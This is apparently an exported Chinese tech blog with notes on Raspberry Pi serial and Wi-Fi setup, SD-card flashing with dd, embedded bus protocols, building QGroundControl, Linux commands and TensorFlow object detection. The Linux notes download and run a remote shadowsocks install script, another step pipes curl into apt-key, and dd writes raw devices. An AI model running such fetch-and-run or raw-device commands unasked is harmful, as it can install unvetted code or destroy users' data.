|+--------------------------+#通过上下键选择Serial port setup+----------------------------------- +| A - Serial Device : /dev/ttyUSB0 || B - Lockfile Location : /var/lock || C - Callin Program : || D - Callout Program : || E - Bps/Par/Bits : 115200 8N1 || F - Hardware Flow Control : Yes || G - Software Flow Control : No || || Change which setting? |+----------------------------------+# 设置Serial Device为/dev/ttyUSB0，然后推出到上一界面，使用enter键Save setup as dfl，保存配置。下次即可直接运行minicom使用之前保存的配置进行串口通信 # 这时候要选择单独Exit（退出），不要选择Exit from Minicom（退出Minicom），不然你就把minicom关了。# 这时即可连接树莓派。 连接上树莓派后，输入用户名pi和密码raspberry，即可进入系统。1234567891011121314151617Raspbian GNU/Linux 9 raspberrypi ttyS0 raspberrypi login: pi Password: Last login: Tue Oct 9 13:12:40 UTC 2018 on tty1 Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7l The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Wi-Fi is disabled because the country is not set. Use raspi-config to set the country before use. pi@raspberrypi:~$ 退出minicom，按Ctrl＋A，再按下X键，会提示你是否退出，yes就可以了。 配置树莓派wifi连接查看周围wifi热点信息1pi@raspberrypi:~$ iwlist scan 配置连接到wifi热点123456789101112# 编辑wifi文件pi@raspberrypi:~$ sudo vi /etc/wpa_supplicant/wpa_supplicant.conf# 在该文件最后添加下面的话network=&#123; ssid=&quot;WIFINAME&quot; psk=&quot;password&quot;&#125;# 引号部分分别为wifi的名字和密码# 重启系统pi@raspberrypi:~$ sudo init 6# 登录后查看是否连接成功pi@raspberrypi:~$ ip addr 参考文献 https://www.cnblogs.com/zcshan/archive/2010/12/03/com.html ,by 水寒 https://zh.wikipedia.org/wiki串行端口 , by wikipedia https://blog.csdn.net/he_wen_jie/article/details/50983076. by hwj666 https://linux.cn/article-3587-1.html , by linux中国 https://blog.csdn.net/JAZZSOLDIER/article/details/70170466 ， by SoldierJazz2018 http://blog.51cto.com/irinilu/289622, by feng9422 Pipci. Linux 串口终端调试工具minicom[EB/OL].https://blog.csdn.net/Pipcie/article/details/79379451, 2018-02-26. https://blog.csdn.net/huayucong/article/details/51376279， by huayucong USB转串口CH340接线方法,2015-11-03.]]></content>
      <tags>
        <tag>树莓派</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派操作系统镜像烧录方法指南]]></title>
    <url>%2F2018%2F11%2F03%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F%E7%83%A7%E5%BD%95%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[树莓派是一个微型计算机硬件平台，为使其正常工作还需要安装操作系统。通常将树莓派操作系统烧录到SD卡上，再将SD卡插到树莓派上。加电启动后，树莓派就会从SD卡引导启动操作系统，开始工作。这里SD卡就相当于普通计算机的硬盘。下面记录在Debian Linux下烧录树莓派操作系统到SD卡的方法。 镜像烧录工具EtcherEtcher是树莓派官方推荐的镜像烧录工具。它采用图形界面，支持Windows、Linux、Mac，使用简单方便，推荐普通用户使用。 ddLinux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。dd命令功能很强大的，对于一些比较底层的问题，使用dd命令往往可以得到出人意料的效果。用的比较多的还是用dd来备份裸设备。同样也可用dd命令烧录系统镜像。 使用dd命令必须非常小心，如果输出指定了错误分区，将摧毁该分区的所有数据。 Linux下镜像烧录过程使用Etcher烧录镜像比较简单，重点介绍使用dd命令烧录镜像的方法。 查找sd卡设备可使用lsblk或者fdisk命令查找sd卡存储设备。需要注意的是： 块设备以/dev/sdX命名，其中X是小写字母，例如/dev/sda。 测试时发现当计算机只有usb3.0接口时，将不识别usb2.0的sd读卡器。 烧录镜像到sd卡将镜像烧录到sd卡使用如下dd命令将树莓派镜像少量到sd卡：1dd bs=4M if=2018-10-09-raspbian-stretch.img of=/dev/sdX conv=fsync 其中： if=文件名：输入文件名，缺省为标准输入。即指定源文件。 of=文件名：输出文件名，缺省为标准输出。即指定目的文件。 bs=bytes：同时设置读入/输出的块大小为bytes个字节。 conv=conversion：用指定的参数转换文件。 将压缩镜像烧录到sd卡当文件系统不支持大于4GB的文件时，可使用利用管道技术烧录镜像，命令如下：1unzip -p 2018-10-09-raspbian-stretch.zip | sudo dd of=/dev/sdX bs=4M conv=fsync 检查烧录进度默认情况下dd命令不给出烧录进度信息，最新的dd提供status=progress选项给出进度信息，命令如下：1dd bs=4M if=2018-10-09-raspbian-stretch.img of=/dev/sdX status=progress conv=fsync 或者可使用dcfldd命令替换dd进行烧录操作。 检查镜像是否正确的烧录到sd卡先使用dd命令将sd卡中内容复制到硬盘，在使用diff或者md5sum检查镜像文件与sd卡内容镜像之间的一致性。 之前dd命令烧录镜像到sd卡完成后会在shell中输出如下结果：123xxx+0 records inyyy+0 records outyyyyyyyyyy bytes (yyy kB, yyy KiB) copied, 0.00144744 s, 283 MB/s xxx是我们需要的，表示读取xxx块记录烧录到sd卡，xxx乘以bs=4M应该等于原始镜像的大小。 使用如下命令复制sd卡内容到硬盘上：12# 经测试count命令没有其作用，该命令将整个sd内容复制到了硬盘，但我们期望只复制之前烧录到sd卡内容dd bs=4M if=/dev/sdX of=from-sd-card.img count=xxx 如果from-sd-card.img文件大于原始镜像文件，那么先使用truncate命令将from-sd-card.img缩小到原始镜像文件的大小，命令如下：1truncate --reference 2018-10-09-raspbian-stretch.img from-sd-card.img 使用diff命令比较两者直接的一致性，如果不一致，可能烧录过程中有错误。1diff -s from-sd-card.img 2018-10-09-raspbian-stretch.img 使用sync命令强制将缓存写入硬盘，然后umount sd卡文件系统，最后移除sd卡。 参考文献 https://www.raspberrypi.org/documentation/installation/installing-images/linux.md, by raspberrypi. https://blog.csdn.net/liumang_D/article/details/3899462, by liumang_d. https://linux.cn/article-8024-1.html, by linux中国 https://www.jianshu.com/p/ff09ceffa816, by 二石兄.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习笔记]]></title>
    <url>%2F2018%2F11%2F03%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[WiringPi简介WiringPi是应用于树莓派平台的GPIO控制库函数，WiringPi遵守GUN Lv3。wiringPi使用C或者C++开发并且可以被其他语言包转，例如python、ruby或者PHP等。WiringPi中的函数类似于Arduino的wiring系统，这使得熟悉arduino的用户使用wringPi更为方便。 树莓派具有26个普通输入和输出引脚。在这26个引脚中具有8个普通输入和输出管脚，这8个引脚既可以作为输入管脚也可以作为输出管脚。除此之外，树莓派还有一个2线形式的I2C、一个4线形式的SPI和一个UART接口。树莓派上的I2C和SPI接口也可以作为普通端口使用。如果串口控制台被关闭便可以使用树莓派上的UART功能。如果不使用I2C，SPI和UART等复用接口，那么树莓派总共具有8+2+5+2 =17个普通IO。 wiringPi包括一套gpio控制命令，使用gpio命令可以控制树莓派GPIO管脚。用户可以利用gpio命令通过shell脚本控制或查询GPIO管脚。wiringPi是可以扩展的，可以利用wiringPi的内部模块扩展模拟量输入芯片，可以使用MCP23x17/MCP23x08（I2C 或者SPI）扩展GPIO接口。另外可通过树莓派上的串口和Atmega（例如arduino等）扩展更多的GPIO功能。另外，用户可以自己编写扩展模块并把自定义的扩展模块集成到wiringPi中。WiringPi支持模拟量的读取和设置功能，不过在树莓派上并没有模拟量设备。但是使用WiringPi中的软件模块却可以轻松地应用AD或DA芯片。 I2CI²C（Inter-Integrated Circuit）字面上的意思是集成电路之间，它其实是I²C Bus简称，所以中文应该叫集成电路总线，它是一种串行通信总线，使用多主从架构，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边设备而发展。I²C的正确读法为“I平方C”（”I-squared-C”），而“I二C”（”I-two-C”）则是另一种错误但被广泛使用的读法。自2006年10月1日起，使用I²C协议已经不需要支付专利费，但制造商仍然需要付费以获取I²C从属设备地址。 设计说明I²C只使用两条双向漏极开路（Open Drain）（串行数据（SDA）及串行时钟频率（SCL））并利用电阻将电位上拉。I²C允许相当大的工作电压范围，但典型的电压准位为+3.3V或+5v。 I²C的参考设计使用一个7比特长度的地址空间但保留了16个地址，所以在一组总线最多可和112个节点通信[a]。常见的I²C总线依传输速率的不同而有不同的模式：标准模式（100 Kbit/s）、低速模式（10 Kbit/s），但时钟频率可被允许下降至零，这代表可以暂停通信。而新一代的I²C总线可以和更多的节点（支持10比特长度的地址空间）以更快的速率通信：快速模式（400 Kbit/s）、高速模式（3.4 Mbit/s）。 虽然最大的节点数目是被地址空间所限制住，但实际上也会被总线上的总电容所限制住，一般而言为400 pF。 如上所述，参考设计为使用串行数据线（SDA）和串行时钟线（SCL）、拥有7bit寻址空间的总线。 总线上有两种类型角色的节点： 主节点 - 产生时钟并发起与从节点的通信 从节点 - 接收时钟并响应主节点的寻址 该总线是一种多主控总线，即可以在总线上放置任意多主节点。此外，在停止位（STOP）发出后，一个主节点也可以成为从节点，反之亦然。 总线上有四种不同的操作模式，虽然大部分设备只作为一种角色和使用其中两种操作模式： 主节点发送 - 主节点发送数据给从节点 主节点接收 - 主节点接收从节点数据 从节点发送 - 从节点发送数据给主节点 从节点接收 - 从节点接收主节点数据 一开始，主节点处于主节点发送模式，发送起始位（START），跟着发送希望与之通信的从节点的7bit位地址，最后再发送一个bit读写位，该数据位表示主节点想要与从节点进行读（1）还是写（0）操作。 如果从节点在总线上，它将以ACK字符比特位应答（低有效）该地址。主节点收到应答后，根据它发送的读写位，处于发送模式或者接收模式，从节点则处于对应的相反模式（接收或发送）。 地址和数据首先发送最高有效位。 起始位在SCL位高时，由SDA上电平从高变低表示；停止位在SCL为高时，由SDA上电平从低变高表示。其他SDA上的电平变化在SCL为低时发生。 如果主节点想要向从节点写数据，它将发送一个字节，然后从节点以ACK位应答，如此重复。此时，主节点处于主节点发送模式，从节点处于从节点接收模式。 如果主节点想要读取从节点数据，它将不断接收从节点发送的一个个字节，在收到每个字节后发送ACK进行应答，除了接收到的最后一个字节。此时，主节点处于主节点接收模式，从节点处于从节点发送模式。 此后，主节点要么发送停止位终止传输，要么发送另一个START比特以发起另一次传输（即“组合消息”）。 应用I²C被应用在简单且其制造成本较传输速度更为重要的外设上。一些常见的应用如下： 为了保存用户的设置而访问NVRAM芯片。 访问低速的数字模拟转换器（DAC）。 访问低速的模拟数字转换器（ADC）。 改变监视器的对比度、色调及色彩平衡设置（视频数据通道）。 改变音量大小。 获取硬件监视及诊断数据，例如中央处理器的温度及风扇转速。 读取实时时钟（Real-time clock）。 在系统设备中用来打开或关闭电源供应。 I²C的另一个强大用途在于微控制器的应用，利用两根通用的输入输出接脚及软件的规划，可以让微控制器控制一个小型网络。 外设可以在系统仍然在运作的同时加入或移出总线，这代表对于有热插拔需求的设备而言是个理想的总线。 像I²C这样的总线之所以流行起来，是因为计算机工程师发现到对于集成电路设计而言，许多的制造成本源自于封装尺寸及接脚数量。更小的包装通常能够减少重量及电源的消耗，这对于移动电话及手持式计算机而言格外重要。 UART在通信和计算机科学中，Serial communication是一个通用概念，泛指所有的串行的通信协议，如RS232、USB、I2C、SPI、1-Wire、Ethernet等。这里的串行（serial），是相对并行通信（parallel communication）来说的，如下图： 理解串行通信的概念之后，大家可能会有疑问：接收方接收到一长串的、表示0/1电平跳变的信号之后，怎么还原出有效的信息呢？有两种方法： 发送端在发送串行数据的同时，提供一个时钟信号，并按照一定的约定（例如在时钟信号的上升沿的时候，将数据发送出去）发送数据，接收端根据发送端提供的时钟信号，以及大家的约定，接收数据。这就是常说的同步串行通信（Synchronous serial communication），I2C、SPI等有时钟信号的协议，都属于这种通信方式。本文不再详述。 发送端在数据发送之前和之后，通过特定形式的信号（例如START信号和STOP信号），告诉接收端，可以开始（或者停止）接收数据了。与此同时，收发两方会约定一个数据发送的速度（就是大名鼎鼎的波特率），发送端在发送START信号之后，就按照固定的节奏发送串行数据，与此同时，接收端在收到START信号之后，也按照固定的节奏接收串行数据。这就是常说的异步串行通信（Asynchronous serial communication），我们本节的主角——串口通信，就是这种通信方式。 UART(Universal Asynchronous Receiver/Transmitter) 即是规定编码格式、bit rate，产生通信所需的bit流的标准。 SPI串行外设接口（Serial Peripheral Interface Bus，SPI），是一种用于短程通信的同步串行通信接口规范，主要应用于单片机系统中。类似I²C。 这种接口首先被Motorola（摩托罗拉）公司开发，然后发展成了一种行业规范。典型应用包含SD卡和液晶显示器。 SPI设备之间使用全双工模式通信，包含一个主机和一个或多个从机。主机产生待读或待写的帧数据，多个从机通过一个片选线路 决定哪个来响应主机的请求。 有时SPI接口被称作四线程接口，SPI准确来讲称为同步串行接口，但是与同步串行接口协议（SSI）不同，SSI是一个四线程 同步通信协议，但是使用差分信号输入同时仅提供一个单工通信信道。 接口SPI总线规定了4个保留逻辑信号接口： SCLK（Serial Clock）：串列时脉，由主机发出 MOSI（Master Output,Slave Input）：主机输出从机输入信号，由主机发出 MISO（Master Input,Slave Output）：主机输入从机输出信号，由从机发出 SS（Slave Selected）：选择信号，由主机发出，一般是低电位有效 尽管上面的引脚名称是最常用的，但在过去，有时会使用其他引脚命名约定，因此旧IC产品的SPI端口引脚名称可能有所不同。 1-Wire1-Wire是Maxim子公司达拉斯半导体的专利技术，仅用单一信号线就可像I²C、SPI一样，传输时钟（clock）又传输数据（data），并且数据传输是双向的。1-Wire使用较低的数据传输速率，通常是用来沟通小型设备，如数字温度计。1-Wire有两种速率：标准模式16kbps，驱动模式142kbps。 单总线只有一根数据线。设备主机或从机通过一个漏极开路或三态端口连接至该数据线，这样允许设备在不发送数据时释放数据总线，以便总线被其它设备所使用。单总线端口为漏极开路其内部等效电路如下图所示。 参考文献 树莓派学习笔记——wiringPi简介、安装和管脚说明 , by xukai871105. I²C, by wikipedia. UART、RS232、TTL关系浅析, by 老狼. 串行外设接口,by wikipedia. 1-Wire,by wikipedia. 1-Wire单总线的基本原理,by ce123. 解析单总线协议（1-wire）,by zhengqijun_.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debian下编译QGroundControl源码]]></title>
    <url>%2F2018%2F11%2F01%2FDebian%E4%B8%8B%E7%BC%96%E8%AF%91QGroundControl%E6%BA%90%E7%A0%81%2F</url>
    <content type="text"><![CDATA[MAVLink（Micro Air Vehicle Link，微型空中飞行器链路通讯协议）是无人飞行器与地面站之间通讯，以及无人飞行器之间通讯最常用的协议。它已经在PX4、APM、PIXHAWK和Parrot AR.Drone飞控平台上进行了大量测试。 QGroundControl则是一种操纵基于MAVLink通信协议的无人机的跨平台地面站开源软件。下面记录在Debian Linux下从源码编译QGroundControl的过程。 下载源码1234# 下载QGroundControl源码git clone --recursive https://github.com/mavlink/qgroundcontrol.git# 更新子模块git submodule update 安装编译环境 下载Qt社区版在线安装器，安装5.11.0版本的Qt，安装路径可在/opt下。 1234# 注意要选择安装5.9+以上版本的Qt，因为构建QGC时需要# 运行qtcreater$ cd /opt/Qt/Tools/QtCreator/bin/$ ./qtcreator 安装必要的包 1sudo apt-get install speech-dispatcher libudev-dev libsdl2-dev 解决编译时libQt5PositioningQuick.so.5不存在的bug 123sudo apt-get install libqt5positioningquick5sudo find /usr/ -name libQt5PositioningQuick.so.5cp /usr/lib/x86_64-linux-gnu/libQt5PositioningQuick.so.5 /opt/Qt/5.10.0/gcc_64/lib/libQt5PositioningQuick.so.5 将当前用户添加到dialout组，获取串口访问权限 12# 运行QGroundControl需要当前用户拥有串口访问权限sudo usermod -a -G dialout $USER 编译运行打开Qt Creater，打开qgroundcontrol.pro工程，构建后运行，即可打开QGroundControl地面站软件。 参考链接 https://blog.csdn.net/hebbely/article/details/79022799, by hebbely https://dev.qgroundcontrol.com/en/getting_started/, by Dronecode]]></content>
      <tags>
        <tag>linux</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux常用命令用法总结]]></title>
    <url>%2F2018%2F11%2F01%2FLinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[记录一些常用的linux命令用法，以备查询。 校验文件下载的文件最好校验完整性，防止被人篡改。以sha256sum为例： 123456789# 以下命令将生成树莓派映像的sha256哈希码，从树莓派官网复制该映像sha256哈希码，以便校验。# 当然通常应该会提供映像的哈希码校验文件。sha256sum 2018-10-09-raspbian-stretch.zip &gt;2018-10-09-raspbian-stretch.zip.sha256sum# 使用下面校验文件的完整性，如果成功则映像与官方一致，未被篡改。# 注意被校验文件与校验文件应放在同一个目录。sha256sum -c 2018-10-09-raspbian-stretch.zip.sha256sum 转换和复制文件命令Linux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。1234567891011读指定物理扇区：dd if=&lt;源设备&gt; of=&lt;输出设备或文件&gt; skip=&lt;指定扇区值&gt; bs=512 count=1写指定物理扇区：dd if=&lt;输入设备或文件&gt; of=&lt;输出设备&gt; seek=&lt;指定扇区值&gt; bs=512 count=1读取sd启动扇区示例：dd if=/dev/mmcblk0 of=mbrsd.data bs=512 count=1制作光盘iso镜像dd if=/dev/cdrom of=/home/hch/drone.iso status=progress conv=fsync 查找文件12345# find基本语法：find [PATH] [option] [action]find /usr/lib -name libQt5Xml.so# 使用通配符find /usr/lib -name &quot;*ssl*&quot; 批量转换文件格式1234567# 将png格式图像转换为jpg# -1 – 告诉 ls 每行列出一个图像名称的选项标识# -n – 指定最多参数个数，例子中为 1# -c – 指示 bash 运行给定的命令# $&#123;0%.png&#125;.jpg – 设置新转换的图像文件的名字，% 符号用来删除源文件的扩展名ls -1 *.png | xargs -n 1 bash -c &apos;convert &quot;$0&quot; &quot;$&#123;0%.png&#125;.jpg&quot;&apos; 修改用户12# 将用户$USER添加到dialout用户组，以获取串口访问权限sudo usermod -a -G dialout $USER 特殊符号用法123456789#| 管道 (pipeline)，是 UNIX 系统，基础且重要的观念。连结上个指令的标准输出，做为下个指令的标准输入。who | wc -l#! 惊叹号(negate or reverse)，通常它代表反逻辑的作用，譬如条件侦测中，用 != 来代表&quot;不等于&quot;#下例代表显示除了a0, a1 .... a9 这几个文件的其他文件。ls a[!0-9]#&amp; 后台工作，单一个&amp; 符号，且放在完整指令列的最后端，即表示将该指令列放入后台中工作。tar cvfz data.tar.gz data &gt; /dev/null &amp; 终端下载123456789101112# 逐条下载uri.txt文件中每一行uriwget -i uri.txt# 跳过前1000条再下载awk &apos;NR&gt;=1000&apos; url.txt | wget -i -# install proxywget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 终端中打开文件管理器12使用gnome文件管理器打开当前文件夹nautilus ./ 统计1234567891011121314151617# 统计文件行数wc -l file统计某文件夹下文件的个数ls -l |grep &quot;^-&quot;|wc -l统计某文件夹下目录的个数ls -l |grep &quot;^ｄ&quot;|wc -l统计文件夹下文件的个数，包括子文件夹里的ls -lR|grep &quot;^-&quot;|wc -l# 统计文件或文件夹大小du -a -h -d 1 ./# 统计文件状态信息stat file.txt 系统服务管理12345# service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。# service命令本身是一个shell脚本，它在/etc/init.d/目录查找指定的服务脚本，然后调用该服务脚本来完成任务。# 查看系统所有服务状态service --status-all 查询本机公网IP12curl ifconfig.mecurl ipinfo.io 压缩和解压文件1234567# tar命令tar zxvf FileName.tar #解压tar czvf FileName.tar DirName #压缩# zip命令unzip FileName.zip #解压zip -r FileName.zip DirName #压缩 SSH 连接、远程上传下载文件1234567891011# SSH 远程登入 Ubuntu 机 ssh username@192.168.0.1# 将 文件/文件夹 从远程 Ubuntu 机拷至本地(scp) scp -r username@192.168.0.1:/home/username/remotefile.txt remotefile.txt# 将 文件/文件夹 从本地拷至远程 Ubuntu 机(scp) scp -r localfile.txt username@192.168.0.1:/home/username/# rsync大文件断电续传，远程服务器需安装rsyncrsync -P --rsh=ssh root@192.168.0.1:/root/fgdata.tar fgdata.tar 参考链接 初窥Linux 之 我最常用的20条命令,by ljianhui. Linux的五个查找命令,by 阮一峰. shell脚本中一些特殊符号, by 阿笨猫. vultr proxy proxychains配置,by Verne.]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用tensorflow_object_detection_api训练自定义模型]]></title>
    <url>%2F2018%2F10%2F20%2F%E4%BD%BF%E7%94%A8tensorflow-object-detection-api%E8%AE%AD%E7%BB%83%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[近期研究目标对象检测和识别，发现谷歌开源的基于tensorflow的object detection api模型效果不错，于是git clone下来测试一下。下面记录我在debian linux上安装配置object detection api模型，构建自定义数据集，训练和测试object detection api模型的过程，以及整个过程中遇到的一下问题，需要注意的事项。 准备工作docker安装TensorFlow 程序在 GPU 上的运行速度通常要比在 CPU 上快得多，在系统满足NVIDIA 软件要求的前提下，推荐使用支持 GPU 的 TensorFlow。 官方推荐使用Docker简化TensorFlow的GPU支持配置，这样只需要linux主机安装好Nvidia GPU驱动即可。 安装docker安装docker的方法可参考链接1。 安装nvidia-docker 123456789# Add the package repositoriescurl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/debian9/nvidia-docker.list | \ sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt-get update# Install nvidia-docker2 and reload the Docker daemon configurationsudo apt-get install -y nvidia-docker2sudo service docker restart 下载最新支持GPU和Python3的tensorflow映像[2] 1docker pull tensorflow/tensorflow:latest-gpu-py3 测试tensorflow映像 12docker run --runtime=nvidia -it --rm tensorflow/tensorflow:latest-gpu-py3 \ python -c &quot;import tensorflow as tf; print(tf.contrib.eager.num_gpus())&quot; 下载TFModel库及其相关库1234# 基于tensorflow的模型和例子git clone https://github.com/tensorflow/models.git# raccoon数据集，可参考其中生成TFRecord格式数据的方法git clone https://github.com/datitran/raccoon_dataset.git 安装Python虚拟环境管理工具1234# 具体安装配置过程参见链接3sudo pip3 install virtualenvsudo pip3 install virtualenvwrappermkvirtualenv object-detection --python=/usr/bin/python3# 创建python3虚拟环境 数据标注以分类几何形状为例，收集相关图片后，需要对它们进行标注。推荐使用 LabelImg 进行标注，生成的文件是 PASCAL VOC 的 xml 格式。这个工具还可以加载标注文件，检查标注结果[3]。123456789git clone https://github.com/tzutalin/labelImg.gitworkon object-detection# 启动python3虚拟环境workon object-detection# 安装配置labelImgsudo apt-get install pyqt5-dev-toolssudo pip3 install -r requirements/requirements-linux-python3.txtmake qt5py3python3 labelImg.py 除了标注图片，还需创建一个 .pbtxt 文件用来说明标注的分类。例如：123456789101112item &#123; id: 1 name: &apos;circle&apos;&#125;item &#123; id: 2 name: &apos;square&apos;&#125;item &#123; id: 3 name: &apos;triangle&apos;&#125; 需要特别注意以下两点： name 不支持直接写中文，需要 UTF-8 编码 id 从 1 开始编号，不能从 0 开始编号。 数据准备标注好的数据是图片文件（.jpg）和标注文件（.xml），而 TensorFlow 不能直接用这些数据作为输入，还需要转成 TFRecord 格式。可采用两种方法生成TFRecord格式数据： tensorflow/models中方法 项目中使用create_pascal_tf_record.py, create_pet_tf_record.py生成TFrecord 格式数据 raccoon_dataset中方法 项目中使用xml_to_csv.py把xml合并成一个CSV文件，使用split labels.ipynb 随机划分训练集和测试集，以及使用generate_tfrecord.py 生成相对应的 TFRecord 训练集和测试集。123456789workon object-detection# 将生成geometry_labels.csvpython xml_to_csv.py# 打开split labels.ipynb生产训练集train_labels.csv和测试集test_labels.csvjupyter notebook# 创建训练用TFRecord文件:python generate_tfrecord.py --csv_input=data/train_labels.csv --output_path=training/geometry_train.record# 创建测试用TFRecord文件:python generate_tfrecord.py --csv_input=data/test_labels.csv --output_path=training/geometry_test.record 第二种方法比较直观，因此我采用第二种方法生产TFRecord数据。 安装配置安装TFModel依赖123456789101112workon object-detection# For CPUpip install tensorflow# For GPUpip install tensorflow-gpupip install --user Cythonpip install --user contextlib2pip install --user pillowpip install --user lxmlpip install --user jupyterpip install --user matplotlib 安装COCO API1234git clone https://github.com/cocodataset/cocoapi.gitcd cocoapi/PythonAPImakecp -r pycocotools &lt;path_to_tensorflow&gt;/models/research/ 编译Protobuf123456# From tensorflow/models/research/wget -O protobuf.zip https://github.com/google/protobuf/releases/download/v3.0.0/protoc-3.0.0-linux-x86_64.zipunzip protobuf.zip# From tensorflow/models/research/./bin/protoc object_detection/protos/*.proto --python_out=. 添加库到PYTHONPATH123# From tensorflow/models/research/# 每次调用TFModel的Object Detection API之前都要设置export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim 安装测试12# if all tests is ok, the installation is no problem.python object_detection/builders/model_builder_test.py 模型训练数据准备 将label_map文件、训练用TFRecord文件、测试用TFRecord文件复制到tensorflow/models/research/object_detection/data文件夹下。 12345# 推荐的数据目录结构+ data - geometry.pbtxt - geometry_test.record - geometry_train.record 下载COCO预训练模型用于迁移学习 123# From tensorflow/models/research/object-detectionwget http://download.tensorflow.org/models/object_detection/ssd_mobilenet_v1_coco_2018_01_28.tar.gztar -xvf ssd_mobilenet_v1_coco_2018_01_28.tar.gz 修改解压后模型文件夹中pipeline.config 解压ssd_mobilenet_v1_coco_2018_01_28模型后会看到一个 .config 文件，里面包含有模型的参数，训练的参数，评估的参数等。这里需要修改到的有， 模型参数中的 num_classes，改成你的类别数， 训练参数中的 fine_tune_checkpoint，采用迁移学习，这里路径的指向刚才下载的Pre-train模型，比如 ssd_mobilenet_v1_coco_11_06_2017/model.ckpt train_input_reader 下面的 input_path，改成你的训练数据，例如 data/train.record。label_map_path，改成你的 pbtxt 文件路径，例如 data/object.pbtxt eval_input_reader 下面的 input_path，也需要改成你的测试集，例如 data/test.record。同样，label_map_path，也改成你的 pbtxt 文件路径，例如 data/object.pbtxt1234567891011121314151617181920212223242526272829//pipeline.config修改示例model &#123; ssd &#123; num_classes: 3 ... &#125;&#125;train_config &#123; ... fine_tune_checkpoint: &quot;object_detection/ssd_mobilenet_v1_coco_2018_01_28/model.ckpt&quot; from_detection_checkpoint: true num_steps: 50000&#125;train_input_reader &#123; label_map_path: &quot;object_detection/data/geometry.pbtxt&quot; tf_record_input_reader &#123; input_path: &quot;object_detection/data/geometry_train.record&quot; &#125;&#125;eval_input_reader &#123; label_map_path: &quot;object_detection/data/geometry.pbtxt&quot; shuffle: false num_epochs: 1 num_readers: 1 tf_record_input_reader &#123; input_path: &quot;object_detection/data/geometry_test.record&quot; &#125; sample_1_of_n_examples: 1&#125; 训练数据在GPU上训练TFModel，与在CPU上训练TFModel相比，要快五倍左右，因此推荐在GPU上训练TFModel。 启动docker 12# 启动docker，并使用-v参数将目录/home/$USER挂载到容器上docker run --runtime=nvidia -v /home/$USER:/home/$USER -it tensorflow/tensorflow:latest-gpu-py3 bash 执行训练 1234# From tensorflow/models/research/export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim# 开始训练python object_detection/model_main.py --pipeline_config_path=object_detection/ssd_mobilenet_v1_coco_2018_01_28/pipeline.config --model_dir=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/ --num_train_steps=50000 --alsologtostderr 使用tensorboard查看训练进度 12# From tensorflow/models/research/tensorboard --logdir=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/ 在CPU上训练只需执行第二步和第三步。 导出模型12# From tensorflow/models/research/python object_detection/export_inference_graph.py --input_type=image_tensor --pipeline_config_path=object_detection/ssd_mobilenet_v1_coco_2018_01_28/pipeline.config --trained_checkpoint_prefix=object_detection/ssd_mobilenet_v1_coco_2018_01_28/saved_model/model.ckpt-50000 --output_directory=../../../../ssd_mobilenet_v1_coco_2018_01_28 运行完命令后模型就导出到 ssd_mobilenet_v1_coco_2018_01_28 文件夹中，其中的frozen_inference_graph.pb即是所需模型。 需要注意的是，参数中的 –trained_checkpoint_prefix 是需要指定到单个模型的，例如 model.ckpt-50000，这个50000就是训练了 50000 步后自动保存模型。 参考文献 https://huangwang.github.io/2018/10/18/Debian-Linux下安装Docker的方法/， by jack huang https://www.tensorflow.org/install/docker?hl=zh-cn , by tensorflow. https://huangwang.github.io/2018/10/09/Virtualenv简易教程/ , by jack huang https://laddiexu.github.io/tech/2017/11/04/TF-ODYourData.html , by 菁菁者莪 https://blog.csdn.net/xunan003/article/details/78720189?utm_source=blogxgwz2, by xunan003]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker使用帮助]]></title>
    <url>%2F2018%2F10%2F19%2FDocker%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9%2F</url>
